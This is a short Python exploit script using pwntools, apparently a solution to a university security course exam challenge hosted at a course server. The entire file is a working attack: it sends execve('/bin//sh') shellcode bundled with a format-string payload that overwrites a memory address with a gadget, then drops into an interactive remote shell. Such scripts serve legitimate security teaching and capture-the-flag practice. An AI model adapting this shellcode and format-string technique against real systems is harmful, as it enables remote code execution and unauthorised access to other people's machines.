#!/usr/bin/python

from pwn import *

c = remote("midsem.6447.sec.edu.au", 8021)
#c = gdb.debug("./2")
ebp = 0xff80c1b8
buf = 0xfff0d4d0
unknown = 0xf7dab9a1
return_addr = ebp-100
gadget = 0x08048506
def send_fmt_payload(payload):
	new = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + payload
	c.sendline(new)

f = FmtStr(send_fmt_payload, offset=12, numbwritten=21)
f.write(unknown, gadget)
f.execute_writes()

c.interactive()
